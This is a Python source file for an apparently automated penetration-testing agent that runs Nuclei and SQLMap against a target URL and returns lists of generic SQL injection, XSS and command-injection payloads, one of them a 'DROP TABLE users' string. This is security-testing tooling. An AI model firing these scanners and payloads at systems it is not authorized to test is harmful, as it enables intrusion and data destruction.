"""
ExploitAgent — The Weaponizer
==============================
Tools: SQLMap, Nuclei, ffuf (passive mode for safety), custom payload generator
Output: verified exploits, PoC commands, WAF evasion payloads
NOTE: Only runs against explicitly authorized targets.
"""
from __future__ import annotations
import asyncio
import json
import shutil
from .base import BaseAgent, AgentResult
import logging

logger = logging.getLogger(__name__)

class ExploitAgent(BaseAgent):
    name = "ExploitAgent"
    description = "Exploit verification: SQLMap, Nuclei, payload generation"

    # WAF evasion mutations
    _SQL_MUTATIONS = [
        "' OR '1'='1",
        "' OR 1=1--",
        "'; DROP TABLE users--",
        "1' AND SLEEP(5)--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' OR 'x'='x",
    ]

    async def run(self, target: dict, context: dict) -> AgentResult:
        findings = []
        outputs = {}
        url = target.get("url")

        if not url:
            return AgentResult(
                agent_name=self.name,
                status="failed",
                error="No URL provided for exploitation",
            )

        # ── Nuclei scan ───────────────────────────────────────────────────────
        if shutil.which("nuclei"):
            nuclei_result = await self._run_nuclei(url)
            outputs["nuclei"] = nuclei_result
            findings.extend(self._parse_nuclei(nuclei_result))
        else:
            outputs["nuclei"] = "nuclei not installed"

        # ── SQLMap (detect only, no auto-exploit) ─────────────────────────────
        if shutil.which("sqlmap"):
            sqlmap_result = await self._run_sqlmap(url)
            outputs["sqlmap"] = sqlmap_result
            findings.extend(self._parse_sqlmap(sqlmap_result))
        else:
            outputs["sqlmap"] = "sqlmap not installed"

        # ── Payload generation ────────────────────────────────────────────────
        outputs["generated_payloads"] = self._generate_payloads(target)

        return AgentResult(
            agent_name=self.name,
            status="success",
            findings=findings,
            tool_outputs=outputs,
        )

    async def _run_nuclei(self, url: str) -> str:
        cmd = ["nuclei", "-u", url, "-severity", "critical,high,medium", "-silent", "-json"]
        try:
            proc = await asyncio.create_subprocess_exec(
                *cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
            )
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=120)
            return stdout.decode(errors="replace")
        except Exception as e:
            return f"nuclei error: {e}"

    def _parse_nuclei(self, output: str) -> list[dict]:
        findings = []
        for line in output.strip().splitlines():
            try:
                r = json.loads(line)
                sev = r.get("info", {}).get("severity", "info")
                findings.append(self._make_finding(
                    title=r.get("template-id", "nuclei-finding"),
                    severity=sev,
                    description=r.get("info", {}).get("description", ""),
                    cve_id=r.get("info", {}).get("classification", {}).get("cve-id", [None])[0],
                    confidence=0.85,
                ))
            except json.JSONDecodeError:
                pass
        return findings

    async def _run_sqlmap(self, url: str) -> str:
        cmd = ["sqlmap", "-u", url, "--batch", "--level=1", "--risk=1", "--output-dir=/tmp/sqlmap_out", "--forms"]
        try:
            proc = await asyncio.create_subprocess_exec(
                *cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
            )
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=180)
            return stdout.decode(errors="replace")
        except Exception as e:
            return f"sqlmap error: {e}"

    def _parse_sqlmap(self, output: str) -> list[dict]:
        findings = []
        if "injectable" in output.lower() or "sql injection" in output.lower():
            findings.append(self._make_finding(
                title="SQL Injection (SQLMap confirmed)",
                severity="critical",
                description="SQLMap detected injectable parameter",
                cwe_id="CWE-89",
                confidence=0.95,
            ))
        return findings

    def _generate_payloads(self, target: dict) -> dict:
        """Generate WAF evasion variants for common injection types."""
        return {
            "sqli": self._SQL_MUTATIONS,
            "xss": [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "javascript:alert(1)",
                "';alert(1)//",
                "<svg onload=alert(1)>",
            ],
            "cmd": [
                "; id",
                "| id",
                "$(id)",
                "`id`",
                "&& id",
            ],
        }
